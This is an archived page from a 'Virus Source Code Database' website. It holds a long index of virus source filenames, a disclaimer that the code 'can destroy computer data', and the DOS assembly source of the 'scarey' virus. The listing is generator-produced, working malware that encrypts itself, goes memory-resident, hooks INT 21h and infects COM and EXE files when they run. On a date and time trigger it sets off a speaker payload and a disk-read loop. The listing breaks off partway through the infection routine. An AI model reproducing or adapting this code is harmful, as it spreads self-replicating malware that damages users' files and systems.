<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: scarey_asm</title>
<meta name="KEYWORDS" content="scarey.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for scarey.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="s2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s2_asm.php">s2_asm</a><br>
<a href="sabbath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sabbath_asm.php">sabbath_asm</a><br>
<a href="sad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sad_asm.php">sad_asm</a><br>
<a href="saddam_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/saddam_pas.php">saddam_pas</a><br>
<a href="sample_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sample_asm.php">sample_asm</a><br>
<a href="santa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/santa_asm.php">santa_asm</a><br>
<a href="saratoga_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/saratoga_asm.php">saratoga_asm</a><br>
<a href="satanbg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satanbg_asm.php">satanbg_asm</a><br>
<a href="satanbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satanbug_asm.php">satanbug_asm</a><br>
<a href="satnlh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satnlh_asm.php">satnlh_asm</a><br>
<a href="sbwhywin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sbwhywin_asm.php">sbwhywin_asm</a><br>
<a href="sc89_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sc89_asm.php">sc89_asm</a><br>
<a href="s_canada_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_canada_asm.php">s_canada_asm</a><br>
<a href="scarey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scarey_asm.php">scarey_asm</a><br>
<a href="schrunch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/schrunch_asm.php">schrunch_asm</a><br>
<a href="scorpio_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scorpio_pas.php">scorpio_pas</a><br>
<a href="scramble_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scramble_asm.php">scramble_asm</a><br>
<a href="screw_fi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/screw_fi_asm.php">screw_fi_asm</a><br>
<a href="scroll__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scroll__asm.php">scroll__asm</a><br>
<a href="scroll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scroll_asm.php">scroll_asm</a><br>
<a href="scrunch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scrunch_asm.php">scrunch_asm</a><br>
<a href="sdfe_gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sdfe_gen_asm.php">sdfe_gen_asm</a><br>
<a href="seneca_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/seneca_asm.php">seneca_asm</a><br>
<a href="senecab_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/senecab_asm.php">senecab_asm</a><br>
<a href="sent4625_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sent4625_pas.php">sent4625_pas</a><br>
<a href="sentinel_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sentinel_pas.php">sentinel_pas</a><br>
<a href="serg114_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/serg114_asm.php">serg114_asm</a><br>
<a href="serg118e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/serg118e_asm.php">serg118e_asm</a><br>
<a href="sergant_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sergant_asm.php">sergant_asm</a><br>
<a href="setuprot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/setuprot_asm.php">setuprot_asm</a><br>
<a href="sex666_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sex666_asm.php">sex666_asm</a><br>
<a href="sf_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sf_ii_asm.php">sf_ii_asm</a><br>
<a href="sgarden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sgarden_asm.php">sgarden_asm</a><br>
<a href="shake_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shake_asm.php">shake_asm</a><br>
<a href="s_happy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_happy_asm.php">s_happy_asm</a><br>
<a href="shellt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shellt_asm.php">shellt_asm</a><br>
<a href="shhs__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shhs__asm.php">shhs__asm</a><br>
<a href="shhs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shhs_asm.php">shhs_asm</a><br>
<a href="shimmer2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shimmer2_asm.php">shimmer2_asm</a><br>
<a href="shimmer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shimmer_asm.php">shimmer_asm</a><br>
<a href="shock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shock_asm.php">shock_asm</a><br>
<a href="shy_koo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shy_koo_asm.php">shy_koo_asm</a><br>
<a href="shy-koo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shy-koo_asm.php">shy-koo_asm</a><br>
<a href="silence2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/silence2_asm.php">silence2_asm</a><br>
<a href="silence_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/silence_asm.php">silence_asm</a><br>
<a href="simplex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/simplex_asm.php">simplex_asm</a><br>
<a href="sister_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sister_asm.php">sister_asm</a><br>
<a href="sist_j4j_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sist_j4j_asm.php">sist_j4j_asm</a><br>
<a href="sk1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk1_asm.php">sk1_asm</a><br>
<a href="sk20h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk20h_asm.php">sk20h_asm</a><br>
<a href="sk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk2_asm.php">sk2_asm</a><br>
<a href="sk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk_asm.php">sk_asm</a><br>
<a href="skeleton_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/skeleton_asm.php">skeleton_asm</a><br>
<a href="skism808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/skism808_asm.php">skism808_asm</a><br>
<a href="s_leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_leszop_asm.php">s_leszop_asm</a><br>
<a href="smash_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smash_asm.php">smash_asm</a><br>
<a href="smile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smile_asm.php">smile_asm</a><br>
<a href="smlboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smlboot_asm.php">smlboot_asm</a><br>
<a href="smurf__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smurf__asm.php">smurf__asm</a><br>
<a href="smurf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smurf_asm.php">smurf_asm</a><br>
<a href="sobj3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sobj3_asm.php">sobj3_asm</a><br>
<a href="sound_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sound_asm.php">sound_asm</a><br>
<a href="spawn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/spawn_asm.php">spawn_asm</a><br>
<a href="sq2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sq2_asm.php">sq2_asm</a><br>
<a href="squish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/squish_asm.php">squish_asm</a><br>
<a href="sra1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra1__asm.php">sra1__asm</a><br>
<a href="sra2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra2__asm.php">sra2__asm</a><br>
<a href="sra2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra2_asm.php">sra2_asm</a><br>
<a href="sra3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra3_asm.php">sra3_asm</a><br>
<a href="ssss4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ssss4_asm.php">ssss4_asm</a><br>
<a href="stack__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stack__asm.php">stack__asm</a><br>
<a href="stack_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stack_asm.php">stack_asm</a><br>
<a href="stackvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stackvir_asm.php">stackvir_asm</a><br>
<a href="stealth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stealth__asm.php">stealth__asm</a><br>
<a href="stealth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stealth_asm.php">stealth_asm</a><br>
<a href="ster1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ster1_asm.php">ster1_asm</a><br>
<a href="ster2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ster2_asm.php">ster2_asm</a><br>
<a href="stercul2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stercul2_asm.php">stercul2_asm</a><br>
<a href="sterculi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sterculi_asm.php">sterculi_asm</a><br>
<a href="stioxyl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stioxyl_asm.php">stioxyl_asm</a><br>
<a href="stned_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stned_asm.php">stned_asm</a><br>
<a href="sto_drop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sto_drop_asm.php">sto_drop_asm</a><br>
<a href="stond____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stond____asm.php">stond____asm</a><br>
<a href="stond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stond_asm.php">stond_asm</a><br>
<a href="stone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stone_asm.php">stone_asm</a><br>
<a href="stoned1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned1_asm.php">stoned1_asm</a><br>
<a href="stoned_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_2_asm.php">stoned_2_asm</a><br>
<a href="stoned2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned2_asm.php">stoned2_asm</a><br>
<a href="stoned3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned3_asm.php">stoned3_asm</a><br>
<a href="stoned4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned4_asm.php">stoned4_asm</a><br>
<a href="stoned___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned___asm.php">stoned___asm</a><br>
<a href="stoned_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_asm.php">stoned_asm</a><br>
<a href="stoned_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_f_asm.php">stoned_f_asm</a><br>
<a href="stonedii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stonedii_asm.php">stonedii_asm</a><br>
<a href="stoneds_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoneds_asm.php">stoneds_asm</a><br>
<a href="stone-ef_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stone-ef_asm.php">stone-ef_asm</a><br>
<a href="stranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stranger_asm.php">stranger_asm</a><br>
<a href="stub_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub_____asm.php">stub_____asm</a><br>
<a href="stub____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub____asm.php">stub____asm</a><br>
<a href="stub___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub___asm.php">stub___asm</a><br>
<a href="stub__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub__asm.php">stub__asm</a><br>
<a href="stub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub_asm.php">stub_asm</a><br>
<a href="sturm&amp;_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sturm&_asm.php">sturm&_asm</a><br>
<a href="styx-5b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/styx-5b_asm.php">styx-5b_asm</a><br>
<a href="sumsdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sumsdos_asm.php">sumsdos_asm</a><br>
<a href="sundevil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sundevil_asm.php">sundevil_asm</a><br>
<a href="suriv101_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/suriv101_asm.php">suriv101_asm</a><br>
<a href="suriv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/suriv_asm.php">suriv_asm</a><br>
<a href="survive__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/survive__asm.php">survive__asm</a><br>
<a href="survive_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/survive_asm.php">survive_asm</a><br>
<a href="susan1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan1__asm.php">susan1__asm</a><br>
<a href="susan1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan1_asm.php">susan1_asm</a><br>
<a href="susan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan_asm.php">susan_asm</a><br>
<a href="swansngb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swansngb_asm.php">swansngb_asm</a><br>
<a href="swansong_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swansong_asm.php">swansong_asm</a><br>
<a href="swap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swap_asm.php">swap_asm</a><br>
<a href="sw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sw__asm.php">sw__asm</a><br>
<a href="sw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sw_asm.php">sw_asm</a><br>
<a href="swedish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swedish__asm.php">swedish__asm</a><br>
<a href="swedish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swedish_asm.php">swedish_asm</a><br>
<a href="s_wxyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_wxyc_asm.php">s_wxyc_asm</a><br>
<a href="s-wxyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s-wxyc_asm.php">s-wxyc_asm</a><br>
<a href="sylvia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sylvia_asm.php">sylvia_asm</a><br>
<a href="sysinfct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sysinfct_asm.php">sysinfct_asm</a><br>
<a href="syslock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/syslock_asm.php">syslock_asm</a><br>
<a href="syslockm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/syslockm_asm.php">syslockm_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; target.asm : Unknown by Unknown
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file skeleton.cfg

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    0                      ; For easy calculation of offsets
id = 'DA'                               ; ID word for EXE infections

startvirus:
decrypt:                                ; handles encryption and decryption
          mov  ax,(offset heap - offset startencrypt)/2 ; iterations
patch_startencrypt:
          mov  di,offset startencrypt   ; start of decryption
decrypt_loop:
          db   2eh,81h,05h              ; add word ptr cs:[di], xxxx
decrypt_value dw  0                     ; initialised at zero for null effect
          inc  di                       ; calculate new decryption location
          inc  di
          dec  ax                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          push ds
          push es

          mov  ax,'DA'                  ; Installation check
          int  21h
          cmp  ax,'PS'                  ; Already installed?
          jz  done_install

          mov  ax, es                   ; Get PSP
          dec  ax
          mov  ds, ax                   ; Get MCB

          sub  word ptr ds:[3],(endheap-startvirus+15)/16+1
          sub  word ptr ds:[12h],(endheap-startvirus+15)/16+1
          mov  ax,ds:[12h]
          mov  ds, ax
          inc  ax
          mov  es, ax
          mov  byte ptr ds:[0],'Z'      ; Mark end of chain
          mov  word ptr ds:[1],8        ; Mark owner = DOS
          mov  word ptr ds:[3],(endheap-startvirus+15)/16 ; Set size

          push cs
          pop  ds
          xor  di,di                    ; Destination
          mov  cx,(heap-startvirus)/2+1 ; Bytes to zopy
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          rep  movsw

          mov  di,offset encrypt
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          mov  cx,startencrypt-decrypt
          rep  movsb
          mov  al,0c3h                  ; retn
          stosb

          xor  ax,ax
          mov  ds,ax
          push ds
          lds  ax,ds:[21h*4]            ; Get old int handler
          mov  word ptr es:oldint21, ax
          mov  word ptr es:oldint21+2, ds
          pop  ds
          mov  word ptr ds:[21h*4], offset int21 ; Replace with new handler
          mov  ds:[21h*4+2], es         ; in high memory
done_install:
          mov  ah,2ah                   ; Get current date
          int  21h
          cmp  ch,1                     ; Check hour
          jle  noise
          
          mov  ah,2ah                   ; Get current date
          int  21h
          cmp  al,6                     ; Check date of week
          jnz  exit_virus
         
          mov  ah,2ch                   ; Get current time
          int  21h
          cmp  ch,22                    ; Check the hour
          jae  activate
          
exit_virus:
          pop  es
          pop  ds
          cmp  sp,id                    ; EXE or COM?
          jz   returnEXE
returnCOM:
          lea  si,[bp+offset save3]
          mov  di,100h
          push di                       ; For later return
          movsw
          movsb
          retn                          ; 100h is on stack
returnEXE:
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+oldCSIP+2],ax
          add  ax,word ptr cs:[bp+oldSSSP+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+oldSSSP]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
oldCSIP   db ?                          ; Original CS:IP (4 bytes)
save3     db 0cdh,20h,0                 ; First 3 bytes of COM file
oldSSSP   dd ?                          ; Original SS:SP

noise:
                mov     cx,0001h                ; First argument is 3
new_shot:       push    cx                      ; Save the current count
                mov     dx,0140h                ; DX holds pitch
                mov     bx,0100h                ; BX holds shot duration
                in      al,061h                 ; Read the speaker port
                and     al,11111100b            ; Turn off the speaker bit
fire_shot:      xor     al,2                    ; Toggle the speaker bit
                out     061h,al                 ; Write AL to speaker port
                add     dx,09248h               ;
                mov     cl,3                    ;
                ror     dx,cl                   ; Figure out the delay time
                mov     cx,dx                   ;
                and     cx,01FFh                ;
                or      cx,10                   ;
shoot_pause:    loop    shoot_pause             ; Delay a bit
                dec     bx                      ; Are we done with the shot?
                jnz     fire_shot               ; If not, pulse the speaker
                and     al,11111100b            ; Turn off the speaker bit
                out     061h,al                 ; Write AL to speaker port
                mov     bx,0002h                ; BX holds delay time (ticks)
                xor     ah,ah                   ; Get time function
                int     1Ah                     ; BIOS timer interrupt
                add     bx,dx                   ; Add current time to delay
shoot_delay:    int     1Ah                     ; Get the time again
                cmp     dx,bx                   ; Are we done yet?
                jne     shoot_delay             ; If not, keep checking
                pop     cx                      ; Restore the count
                loop    new_shot                ; Do another shot
                jmp     exit_virus

 
activate:                                    ;sound and fury start
                cli                          ;turn off interrupts
                mov     dx,2                 
agin1:          mov     bp,100               ;do 100 cycles of sound
                mov     si,2000              ;1st frequency
                mov     di,17000             ;2nd frequency
                mov     al,10110110b         ;address of channel 2 mode 3
                out     43h,al               ;send to port
agin2:          mov     bx,si                ;place sound number in bx
backerx:        mov     ax,bx                ;now put in ax
                out     42h,al               
                mov     al,ah                
                out     42h,al               
                in      al,61h               ;get port value
                or      al,00000011b         ;turn speaker on
                out     61h,al               
                mov     cx,2EE0h             ;delay 
looperx:        loop    looperx        ;do nothing loop so sound is audible
                xchg    di,si                
                in      al,61h               ;get port value
                and     al,11111100b         ;AND - turn speaker off
                out     61h,al               ;send it
                dec     bp                   ;decrement repeat count
                jnz     agin2                ;if not = 0 do again
                mov     ax,10                ;10 repeats of 60000 loops
back:           mov     cx,0EA60h            ;loop count (in hex for TASM)
loopery:        loop    loopery         ;delay loops - no sound between bursts
                dec     ax                   
                jnz     back                 ;if not = 0 loop again
                dec     dx                   
                jnz     agin1                ;if not = 0 do whole thing again
                sti                          ;restore interrupts 
                
                
                
                mov     si,0              ;scarey part: drive reads real
scarey:         lodsb                     ;fast ala Michelangelo-style
                mov     ah,al             ;over-write, but this routine only
                lodsb                     ;gets random bytes here for a 
                and     al,3              ;cylinder to READ
                mov     dl,80h
                mov     dh,al
                mov     ch,ah
                mov     cl,1
                mov     bx,offset last    ;buffer to read into
                mov     ax,201h
                int     13h
                jmp     short scarey      ;yow! scarey! just think if this
                                          ;was made by someone not as nice as
                                          ;me

int21:                                  ; New interrupt handler
          cmp  ax,'DA'                  ; Installation check?
          jnz  notinstall
          mov  ax,'PS'
          iret
notinstall:
          pushf
          push ax
          push bx
          push cx
          push dx
          push si
          push di                       ; don't need to save bp
          push ds
          push es
          cmp  ax,4b00h                 ; Infect on execute
          jz   infectDSDX
exithandler:
          pop  es
          pop  ds
          pop  di
          pop  si
          pop  dx
          pop  cx
          pop  bx
          pop  ax
          popf
          db 0eah                       ; JMP SSSS:OOOO
oldint21  dd ?                          ; Go to orig handler

infectDSDX:
          mov  ax,4300h
          int  21h
          push ds
          push dx
          push cx                       ; Save attributes
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  ax,3d02h                 ; Open read/write
          int  21h
          xchg ax,bx

          mov  ax,5700h                 ; Get creation date/time
          int  21h
          push cx                       ; Save date and
          push dx                       ; time

          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          mov  ah,3fh                   ; Read file to buffer
          mov  dx,offset buffer         ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ax,4202h                 ; Go to end of file
          xor  cx,cx
          cwd
          int  21h

          mov  word ptr filesize,ax
          mov  word ptr filesize+2,dx
          cmp  word ptr buffer,'ZM'     ; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr filesize
          cmp  ax,1000                  ; Is it too small?
          jb   done_file

          cmp  ax,65535-(endheap-decrypt) ; Is it too large?
          ja   done_file

          mov  cx,word ptr buffer+1     ; get jmp location
          add  cx,heap-startvirus+3     ; Adjust for virus size
          cmp  ax,cx                    ; Already infected?
          je   done_file
          jmp  infect_com
checkEXE:
          cmp  word ptr buffer+10h,id   ; is it already infected?
          jnz  infect_exe
done_file:
          mov  ax,5701h                 ; Restore creation date/time
          pop  dx                       ; Restore date and
          pop  cx                       ; time
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          pop  cx
          pop  dx
          pop  ds                       ; Restore filename
          call attributes               ; attributes

          jmp  exithandler
infect_exe:
          mov  cx, 1ah
          push cx
          push bx                       ; Save file handle
          les  ax,dword ptr buffer+14h  ; Save old entry point
          mov  word ptr oldCSIP, ax
          mov  word ptr oldCSIP+2, es

          les  ax,dword ptr buffer+0Eh  ; Save old stack
          mov  word ptr oldSSSP,es
          mov  word ptr oldSSSP+2,ax

          mov  ax,word ptr buffer+8     ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax,dword ptr filesize    ; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr buffer+14h, dx  ; New entry point
          mov  word ptr buffer+16h, ax

          mov  word ptr buffer+0Eh, ax  ; and stack
          mov  word ptr buffer+10h, id

          pop  dx                       ; get file length
          pop  ax
          pop  bx                       ; Restore file handle

          add  ax, heap-startvirus      ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr buffer+4, dx    ; new file size
          mov  word ptr buffer+2, ax

          push cs                       ; restore ES
          pop  es

          mov  ax,word ptr buffer+14h   ; needed later
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          push cx
          sub  ax,cx
          mov  si,offset buffer
          mov  di,offset save3
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
finishinfection:
          add  ax,offset startencrypt-offset decrypt
          mov  word ptr encrypt+(patch_startencrypt-startvirus)+1,ax

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  word ptr encrypt+(decrypt_value-startvirus),dx ; New encrypt. value
